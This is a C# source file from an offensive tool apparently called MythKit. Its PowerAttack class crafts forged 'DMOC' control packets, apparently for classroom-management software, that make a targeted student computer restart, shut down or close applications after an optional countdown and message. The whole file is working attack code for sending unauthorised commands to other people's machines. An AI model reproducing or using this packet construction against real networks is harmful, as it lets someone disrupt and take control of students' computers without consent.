using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Runtime.Remoting.Messaging;
using System.Text;
using System.Windows.Controls;

namespace MythKit.Pages.ReplayAttack.AttackPatterns
{
    public partial class PowerAttack : UserControl, IAttackPattern
    {
        public PowerAttack()
        {
            InitializeComponent();
        }

        public string AttackName => "电源控制/关闭应用";
        public string AttackId => "dmoc_extra_attack";
        public AttackTarget Target => AttackTarget.Student;

        public void Deserialize(Dictionary<string, object> serializedData)
        {
            if (serializedData == null)
                return;

            if (serializedData.TryGetValue("option", out object option) && option is string value)
            {
                if (string.Equals(value, "restart", StringComparison.OrdinalIgnoreCase))
                {
                    RestartRadioButton.IsChecked = true;
                    ShutdownRadioButton.IsChecked = false;
                    CloseApplicationRadioButton.IsChecked = false;
                }
                else if (string.Equals(value, "shutdown", StringComparison.OrdinalIgnoreCase))
                {
                    RestartRadioButton.IsChecked = false;
                    ShutdownRadioButton.IsChecked = true;
                    CloseApplicationRadioButton.IsChecked = false;
                }
                else if (string.Equals(value, "close_application", StringComparison.OrdinalIgnoreCase))
                {
                    RestartRadioButton.IsChecked = false;
                    ShutdownRadioButton.IsChecked = false;
                    CloseApplicationRadioButton.IsChecked = true;
                }
            }

            if (serializedData.TryGetValue("immediateExecution", out object immediateExecution) && immediateExecution is bool immediate)
                ImmediateExecutionCheckBox.IsChecked = immediate;

            if (serializedData.TryGetValue("message", out object message) && message is string text)
                Message.Text = text;

            if (serializedData.TryGetValue("countdown", out object countdownValue) &&
                double.TryParse(Convert.ToString(countdownValue), out double countdown) &&
                !double.IsNaN(countdown) && !double.IsInfinity(countdown) && countdown >= 0)
                Countdown.Value = countdown;
        }

        public Dictionary<string, object> Serialize() => new Dictionary<string, object>
        {
            ["option"] = CloseApplicationRadioButton.IsChecked == true
                ? "close_application"
                : ShutdownRadioButton.IsChecked == true ? "shutdown" : "restart",
            ["immediateExecution"] = ImmediateExecutionCheckBox.IsChecked == true,
            ["message"] = Message.Text,
            ["countdown"] = Countdown.Value
        };

        public AttackPacket ConstructPacket(ref string errorMessage, IPAddress targetIP, int cycleId, int groupId)
        {
            byte[] msg = Encoding.Unicode.GetBytes(AttackPacket.FormatString(Message.Text, targetIP, cycleId, groupId));

            if (0x44 + msg.Length > 582)
            {
                errorMessage = $"消息过长，需要 {0x44 + msg.Length} 字节，最大 582。";
                return new AttackPacket(new List<byte[]> { });
            }

            // 固定头部，直接初始化
            byte[] packet =
            {
                // DMOC
                0x44, 0x4D, 0x4F, 0x43,
                0x00, 0x00, 0x01, 0x00,
                0x2A, 0x02, 0x00, 0x00,
                // RANDOM
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x20, 0x4E, 0x00, 0x00,
                0xC0, 0xA8, 0x89, 0x80,
                0x1D, 0x02, 0x00, 0x00,
                0x1D, 0x02, 0x00, 0x00,
                0x00, 0x02, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00,
                // 类型
                0x00, 0x00, 0x00, 0x00,
                // 倒计时
                0x00, 0x00, 0x00, 0x00,
                0x01, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00,
            };

            byte[] randomBytes = new byte[16];
            new Random().NextBytes(randomBytes);
            Array.Copy(randomBytes, 0, packet, 12, 16);

            // 类型写入
            packet[0x34] = (byte)(CloseApplicationRadioButton.IsChecked == true ? 0x02 : ShutdownRadioButton.IsChecked == true ? 0x14 : 0x13);

            // 是否立即执行
            packet[0x37] = (byte)(ImmediateExecutionCheckBox.IsChecked == true ? 0x10 : 0x00);
            // 倒计时写入
            uint countdown = (uint)(Countdown.Value);
            packet[0x38] = (byte)(countdown & 0xFF);
            packet[0x39] = (byte)((countdown >> 8) & 0xFF);
            packet[0x3A] = (byte)((countdown >> 16) & 0xFF);
            packet[0x3B] = (byte)((countdown >> 24) & 0xFF);

            // 构造最终 582 字节数组，复制头部 + 字符串，其余自动 0
            byte[] result = new byte[582];
            Array.Copy(packet, 0, result, 0, packet.Length);
            Array.Copy(msg, 0, result, 0x44, msg.Length);

            return new AttackPacket(new List<byte[]> { result });
        }
    }
}
